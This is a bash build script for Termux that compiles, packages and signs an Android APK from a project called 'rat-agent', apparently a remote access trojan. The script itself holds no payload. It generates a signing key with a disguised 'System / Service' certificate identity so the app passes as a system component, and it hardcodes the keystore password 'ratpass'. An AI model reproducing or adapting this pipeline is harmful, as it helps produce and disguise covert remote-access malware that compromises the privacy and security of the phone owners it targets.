#!/data/data/com.termux/files/usr/bin/bash
set -e

# ============ CONFIG ============
export ANDROID_HOME="${ANDROID_HOME:-$HOME/android-sdk}"
export ANDROID_JAR="${ANDROID_JAR:-$ANDROID_HOME/platforms/android-34/android.jar}"
KEYSTORE="${KEYSTORE:-$HOME/rat-agent/rat.keystore}"
KS_PASS="${KS_PASS:-ratpass}"
KEY_PASS="${KEY_PASS:-ratpass}"
KEY_ALIAS="${KEY_ALIAS:-rat}"
# ================================

cd ~/rat-agent

if [ ! -f "$ANDROID_JAR" ]; then
    echo "ERROR: android.jar not found at $ANDROID_JAR"
    echo "Set ANDROID_JAR env var or install android-sdk"
    exit 1
fi

if [ ! -f "$KEYSTORE" ]; then
    echo "Keystore not found. Creating..."
    keytool -genkeypair -v -keystore "$KEYSTORE" -alias "$KEY_ALIAS" \
      -keyalg RSA -keysize 2048 -validity 10000 \
      -storepass "$KS_PASS" -keypass "$KEY_PASS" \
      -dname "CN=System, OU=Service, O=System, L=Colombo, C=LK"
fi

echo "[1/8] Cleaning..."
rm -rf build/classes build/*.dex build/res.zip build/base.apk build/unsigned.apk build/aligned.apk agent.apk agent.apk.idsig build/gen
mkdir -p build/classes build/gen

echo "[2/8] javac..."
find src -name "*.java" > build/sources.txt
javac -source 1.8 -target 1.8 \
  -bootclasspath "$ANDROID_JAR" \
  -classpath "$ANDROID_JAR" \
  -d build/classes \
  @build/sources.txt

echo "[3/8] d8..."
find build/classes -name "*.class" > build/classes.txt
d8 --output build/ --lib "$ANDROID_JAR" --min-api 26 \
  @build/classes.txt

echo "[4/8] aapt2 compile..."
aapt2 compile --dir res -o build/res.zip

echo "[5/8] aapt2 link..."
aapt2 link -o build/base.apk \
  -I "$ANDROID_JAR" \
  --manifest AndroidManifest.xml \
  --min-sdk-version 26 \
  --target-sdk-version 34 \
  --java build/gen \
  build/res.zip

echo "[6/8] Add dex..."
cd build
cp base.apk unsigned.apk
zip -uj unsigned.apk classes.dex > /dev/null
cd ..

echo "[7/8] Sign (skip zipalign)..."
apksigner sign \
  --ks "$KEYSTORE" --ks-key-alias "$KEY_ALIAS" \
  --ks-pass "pass:$KS_PASS" --key-pass "pass:$KEY_PASS" \
  --out agent.apk build/unsigned.apk
  
apksigner verify agent.apk
echo ""
echo "DONE - $(date)"
ls -la --time-style=full-iso agent.apk